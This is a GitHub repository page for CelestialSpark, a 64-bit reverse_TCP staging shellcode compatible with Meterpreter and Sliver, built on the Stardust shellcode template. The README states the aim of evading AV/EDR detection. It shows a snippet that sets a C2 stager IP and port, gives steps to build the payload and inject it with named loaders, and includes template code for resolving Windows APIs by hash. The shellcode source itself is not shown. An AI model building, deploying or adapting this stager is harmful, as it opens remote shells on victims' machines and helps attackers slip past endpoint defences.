# https://github.com/Karkas66/CelestialSpark

[Skip to content](https://github.com/Karkas66/CelestialSpark#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/Karkas66/CelestialSpark) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/Karkas66/CelestialSpark) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/Karkas66/CelestialSpark) to refresh your session.Dismiss alert

{{ message }}

[Karkas66](https://github.com/Karkas66)/ **[CelestialSpark](https://github.com/Karkas66/CelestialSpark)** Public

- [Notifications](https://github.com/login?return_to=%2FKarkas66%2FCelestialSpark) You must be signed in to change notification settings
- [Fork\\
10](https://github.com/login?return_to=%2FKarkas66%2FCelestialSpark)
- [Star\\
103](https://github.com/login?return_to=%2FKarkas66%2FCelestialSpark)


Version 2 - A modern 64-bit position independent meterpreter and Sliver compatible reverse\_TCP Staging Shellcode based on Cracked5piders Stardust


[103\\
stars](https://github.com/Karkas66/CelestialSpark/stargazers) [10\\
forks](https://github.com/Karkas66/CelestialSpark/forks) [Branches](https://github.com/Karkas66/CelestialSpark/branches) [Tags](https://github.com/Karkas66/CelestialSpark/tags) [Activity](https://github.com/Karkas66/CelestialSpark/activity)

[Star](https://github.com/login?return_to=%2FKarkas66%2FCelestialSpark)

[Notifications](https://github.com/login?return_to=%2FKarkas66%2FCelestialSpark) You must be signed in to change notification settings

# Karkas66/CelestialSpark

main

[**1** Branch](https://github.com/Karkas66/CelestialSpark/branches) [**1** Tag](https://github.com/Karkas66/CelestialSpark/tags)

[Go to Branches page](https://github.com/Karkas66/CelestialSpark/branches)[Go to Tags page](https://github.com/Karkas66/CelestialSpark/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![Karkas66](https://avatars.githubusercontent.com/u/25013261?v=4&size=40)](https://github.com/Karkas66)[Karkas66](https://github.com/Karkas66/CelestialSpark/commits?author=Karkas66)<br>[Update README.md](https://github.com/Karkas66/CelestialSpark/commit/8fbbf5b53047504e0feda33e21a2b6a873990d8d)<br>11 months agoMar 27, 2025<br>[8fbbf5b](https://github.com/Karkas66/CelestialSpark/commit/8fbbf5b53047504e0feda33e21a2b6a873990d8d) · 11 months agoMar 27, 2025<br>## History<br>[15 Commits](https://github.com/Karkas66/CelestialSpark/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/Karkas66/CelestialSpark/commits/main/) 15 Commits |
| [bin/obj](https://github.com/Karkas66/CelestialSpark/tree/main/bin/obj "This path skips through empty directories") | [bin/obj](https://github.com/Karkas66/CelestialSpark/tree/main/bin/obj "This path skips through empty directories") | [commit Stardust](https://github.com/Karkas66/CelestialSpark/commit/9b2d9f0c3ea1cfc2be8426ede0aaba7e4e0c8528 "commit Stardust") | 2 years agoJan 27, 2024 |
| [include](https://github.com/Karkas66/CelestialSpark/tree/main/include "include") | [include](https://github.com/Karkas66/CelestialSpark/tree/main/include "include") | [Merged CelestialSpark code into Stardust version 2](https://github.com/Karkas66/CelestialSpark/commit/391aeb3590bf3d8b73dee007c43befcc114d2dac "Merged CelestialSpark code into Stardust version 2") | 11 months agoMar 27, 2025 |
| [scripts](https://github.com/Karkas66/CelestialSpark/tree/main/scripts "scripts") | [scripts](https://github.com/Karkas66/CelestialSpark/tree/main/scripts "scripts") | [Merged CelestialSpark code into Stardust version 2](https://github.com/Karkas66/CelestialSpark/commit/391aeb3590bf3d8b73dee007c43befcc114d2dac "Merged CelestialSpark code into Stardust version 2") | 11 months agoMar 27, 2025 |
| [src](https://github.com/Karkas66/CelestialSpark/tree/main/src "src") | [src](https://github.com/Karkas66/CelestialSpark/tree/main/src "src") | [Code Cleanup](https://github.com/Karkas66/CelestialSpark/commit/c43c6f93265acec5696e7592365855b009647bc1 "Code Cleanup") | 11 months agoMar 27, 2025 |
| [static](https://github.com/Karkas66/CelestialSpark/tree/main/static "static") | [static](https://github.com/Karkas66/CelestialSpark/tree/main/static "static") | [Merged CelestialSpark code into Stardust version 2](https://github.com/Karkas66/CelestialSpark/commit/391aeb3590bf3d8b73dee007c43befcc114d2dac "Merged CelestialSpark code into Stardust version 2") | 11 months agoMar 27, 2025 |
| [test](https://github.com/Karkas66/CelestialSpark/tree/main/test "test") | [test](https://github.com/Karkas66/CelestialSpark/tree/main/test "test") | [Merged CelestialSpark code into Stardust version 2](https://github.com/Karkas66/CelestialSpark/commit/391aeb3590bf3d8b73dee007c43befcc114d2dac "Merged CelestialSpark code into Stardust version 2") | 11 months agoMar 27, 2025 |
| [CMakeLists.txt](https://github.com/Karkas66/CelestialSpark/blob/main/CMakeLists.txt "CMakeLists.txt") | [CMakeLists.txt](https://github.com/Karkas66/CelestialSpark/blob/main/CMakeLists.txt "CMakeLists.txt") | [Merged CelestialSpark code into Stardust version 2](https://github.com/Karkas66/CelestialSpark/commit/391aeb3590bf3d8b73dee007c43befcc114d2dac "Merged CelestialSpark code into Stardust version 2") | 11 months agoMar 27, 2025 |
| [Makefile](https://github.com/Karkas66/CelestialSpark/blob/main/Makefile "Makefile") | [Makefile](https://github.com/Karkas66/CelestialSpark/blob/main/Makefile "Makefile") | [Merged CelestialSpark code into Stardust version 2](https://github.com/Karkas66/CelestialSpark/commit/391aeb3590bf3d8b73dee007c43befcc114d2dac "Merged CelestialSpark code into Stardust version 2") | 11 months agoMar 27, 2025 |
| [README.md](https://github.com/Karkas66/CelestialSpark/blob/main/README.md "README.md") | [README.md](https://github.com/Karkas66/CelestialSpark/blob/main/README.md "README.md") | [Update README.md](https://github.com/Karkas66/CelestialSpark/commit/8fbbf5b53047504e0feda33e21a2b6a873990d8d "Update README.md") | 11 months agoMar 27, 2025 |
| View all files |

## Repository files navigation

# CelestialSpark V2

[Permalink: CelestialSpark V2](https://github.com/Karkas66/CelestialSpark#celestialspark-v2)

A modern 64-bit position independent meterpreter and Sliver compatible reverse\_TCP Staging Shellcode based on Cracked5piders Stardust Version 2 (03/2025)

```
#include <common.h>
#include <constexpr.h>
#include <resolve.h>

using namespace stardust;

// Define IP adress of your C2 Stager
#define IP_STR  "10.10.10.10"
// Define PORT 443 of your C2 Stager
#define PORT 443
```

## Why

[Permalink: Why](https://github.com/Karkas66/CelestialSpark#why)

I wanted to improve my understanding of position independent Shellcode, plus... My Meterpreter reverse\_TCP Stager gets caught by a lot of AV/EDRs and I was hoping to somehow get around the IoCs the 15 year old Meterpreter reverse\_TCP Shellcode generated by msfvenom.
Inspirations were:

- [https://github.com/SherifEldeeb/TinyMet](https://github.com/SherifEldeeb/TinyMet)
- [https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block\_reverse\_tcp.asm](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm)

## How does it work

[Permalink: How does it work](https://github.com/Karkas66/CelestialSpark#how-does-it-work)

- not existing HTONS and HTONL functions have been hardcoded
- custom inet\_addr function was rewritten and implemented in main.cc
- Socket creation and interaction functions have been imported from ws2\_32.dll
- Meterpreter Staging Logic hase been copied from the original project and TinyMet

## Usage

[Permalink: Usage](https://github.com/Karkas66/CelestialSpark#usage)

- Git clone
- change IP and Port in main.cc
- disable the messagebox right before the Stage2 shellcode execution (if it bothers you)
- make
- Use your favourite Shellcode Loader/Injector. I Successfully tested:
  - [https://github.com/Cipher7/ChaiLdr](https://github.com/Cipher7/ChaiLdr)
  - [https://github.com/florylsk/ExecIT](https://github.com/florylsk/ExecIT)
  - [https://github.com/3xpl01tc0d3r/ProcessInjection](https://github.com/3xpl01tc0d3r/ProcessInjection)
  - the original Stardust Loader and Stomper written by [Cracked5pider](https://github.com/Cracked5pider)

End of CelestialSpark

# Original Readme from here

[Permalink: Original Readme from here](https://github.com/Karkas66/CelestialSpark#original-readme-from-here)

# Stardust

[Permalink: Stardust](https://github.com/Karkas66/CelestialSpark#stardust)

A modern and easy to use 32/64-bit shellcode template.

- raw strings
- C++20 project
- uses compile time hashing with fnv1a for both function and module resolving

### Basic Usage

[Permalink: Basic Usage](https://github.com/Karkas66/CelestialSpark#basic-usage)

resolving modules from PEB using `resolve::module`:

```
if ( ! (( ntdll.handle = resolve::module( expr::hash_string<wchar_t>( L"ntdll.dll" ) ) )) ) {
    return;
}

if ( ! (( kernel32.handle = resolve::module( expr::hash_string<wchar_t>( L"kernel32.dll" ) ) )) ) {
    return;
}
```

resolving function apis using either `RESOLVE_API` macro or `resolve::api` function:

```
const auto user32 = kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );

decltype( MessageBoxA ) * msgbox = RESOLVE_API( reinterpret_cast<uintptr_t>( user32 ), MessageBoxA );

msgbox( nullptr, symbol<const char*>( "Hello world" ), symbol<const char*>( "caption" ), MB_OK );
```

The `RESOLVE_API` is a wrapper around `resolve::api` to automatically hashes the function name and cast the function pointer to the function type.

string hashing for both UTF-8 and UTF-16 using the compile time `expr::hash_string` function:

```
auto user32_hash      = expr::hash_string<wchar_t>( L"user32.dll" );
auto loadlibrary_hash = expr::hash_string<char>( "LoadLibraryA" );
```

raw strings support for both 32/64-bit by using the `symbol` function:

```
auto caption_string = symbol<const char*>( "hello from stardust" );

user32.MessageBoxA( nullptr, caption_string, symbol<const char*>( "message title" ), MB_OK );
```

easy to add new apis and modules to the instance. Under `include/common.h` the following entry has to be made:

```
class instance {
    ...

    struct
    {
        uintptr_t handle; // base address to user32.dll

        struct {
            D_API( MessageBoxA );
            // more entries can be added here
        };
    } user32 = {
        RESOLVE_TYPE( MessageBoxA ),
        // more entries can be added here
    };

    ...
```

while the `src/main.cc` should resolve the base address of user32 and resolve the api pointer:

```
declfn instance::instance(
    void
) {
    ...
    //
    // resolve user32.dll from PEB if loaded
    if ( ! (( user32.handle = resolve::module( expr::hash_string<wchar_t>( L"user32.dll" ) ) )) ) {
        return;
    }

    //
    // automatically resolve every entry imported
    // by user32 from the structure
    RESOLVE_IMPORT( user32 );
    ...
}
```

semi friendly debugging capabilities via DbgPrint. The project althought needs to be compiled in debug mode by specifying `make debug`. Usage:

```
const auto user32 = kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );

if ( user32 ) {
    DBG_PRINTF( "oh wow look we loaded user32.dll -> %p\n", user32 );
} else {
    DBG_PRINTF( "okay something went wrong. failed to load user32 :/\n" );
}

DBG_PRINTF( "running from %ls (Pid: %d)\n",
    NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
    NtCurrentTeb()->ClientId.UniqueProcess );

DBG_PRINTF( "shellcode @ %p [%d bytes]\n", base.address, base.length );
```

### Building

[Permalink: Building](https://github.com/Karkas66/CelestialSpark#building)

Build in release mode:

```
$ make                                                                                                                                                                                                                                                                                  20:17:26
-> compiling src/main.cc to main.x64.obj
-> compiling src/resolve.cc to resolve.x64.obj
compiling x64 project
/usr/bin/x86_64-w64-mingw32-ld: bin/stardust.x64.exe:.text: section below image base
-> compiling src/main.cc to main.x86.obj
-> compiling src/resolve.cc to resolve.x86.obj
compiling x86 project
/usr/bin/i686-w64-mingw32-ld: bin/stardust.x86.exe:.text: section below image base
$ ll bin                                                                                                                                                                                                                                                                                20:57:10
drwxr-xr-x spider spider 4.0 KB Thu Mar 13 20:57:10 2025 obj
.rw-r--r-- spider spider 752 B  Thu Mar 13 20:57:10 2025 stardust.x64.bin
.rw-r--r-- spider spider 672 B  Thu Mar 13 20:57:10 2025 stardust.x86.bin
```

Build in debug mode:

```
$ make debug                                                                                                                                                                                                                                                                            20:57:14
-> compiling src/main.cc to main.x64.obj
-> compiling src/resolve.cc to resolve.x64.obj
compiling x64 project
/usr/bin/x86_64-w64-mingw32-ld: bin/stardust.x64.exe:.text: section below image base
-> compiling src/main.cc to main.x86.obj
-> compiling src/resolve.cc to resolve.x86.obj
compiling x86 project
/usr/bin/i686-w64-mingw32-ld: bin/stardust.x86.exe:.text: section below image base
$ ll bin                                                                                                                                                                                                                                                                                20:58:13
drwxr-xr-x spider spider 4.0 KB Thu Mar 13 20:58:13 2025 obj
.rw-r--r-- spider spider 1.2 KB Thu Mar 13 20:58:13 2025 stardust.x64.bin
.rw-r--r-- spider spider 1.1 KB Thu Mar 13 20:58:13 2025 stardust.x86.bin
```

## Demo

[Permalink: Demo](https://github.com/Karkas66/CelestialSpark#demo)

x64:
[![x64](https://github.com/Karkas66/CelestialSpark/raw/main/static/stomper.x64.png)](https://github.com/Karkas66/CelestialSpark/blob/main/static/stomper.x64.png)

x86:
[![x86](https://github.com/Karkas66/CelestialSpark/raw/main/static/stomper.x86.png)](https://github.com/Karkas66/CelestialSpark/blob/main/static/stomper.x86.png)

## About

Version 2 - A modern 64-bit position independent meterpreter and Sliver compatible reverse\_TCP Staging Shellcode based on Cracked5piders Stardust


### Topics

[shellcode](https://github.com/topics/shellcode "Topic: shellcode") [pe](https://github.com/topics/pe "Topic: pe") [stager](https://github.com/topics/stager "Topic: stager") [position-in](https://github.com/topics/position-in "Topic: position-in")

### Resources

[Readme](https://github.com/Karkas66/CelestialSpark#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/Karkas66/CelestialSpark).

[Activity](https://github.com/Karkas66/CelestialSpark/activity)

### Stars

[**103**\\
stars](https://github.com/Karkas66/CelestialSpark/stargazers)

### Watchers

[**3**\\
watching](https://github.com/Karkas66/CelestialSpark/watchers)

### Forks

[**10**\\
forks](https://github.com/Karkas66/CelestialSpark/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FKarkas66%2FCelestialSpark&report=Karkas66+%28user%29)

## [Releases](https://github.com/Karkas66/CelestialSpark/releases)

[1tags](https://github.com/Karkas66/CelestialSpark/tags)

## [Packages\  0](https://github.com/users/Karkas66/packages?repo_name=CelestialSpark)

No packages published

## [Contributors\  3](https://github.com/Karkas66/CelestialSpark/graphs/contributors)

- [![@Karkas66](https://avatars.githubusercontent.com/u/25013261?s=64&v=4)](https://github.com/Karkas66)[**Karkas66**](https://github.com/Karkas66)
- [![@Cracked5pider](https://avatars.githubusercontent.com/u/51360176?s=64&v=4)](https://github.com/Cracked5pider)[**Cracked5pider** 5pider](https://github.com/Cracked5pider)
- [![@imposecost](https://avatars.githubusercontent.com/u/156708357?s=64&v=4)](https://github.com/imposecost)[**imposecost**](https://github.com/imposecost)

## Languages

- [C95.9%](https://github.com/Karkas66/CelestialSpark/search?l=c)
- [C++3.5%](https://github.com/Karkas66/CelestialSpark/search?l=c%2B%2B)
- Other0.6%

You can’t perform that action at this time.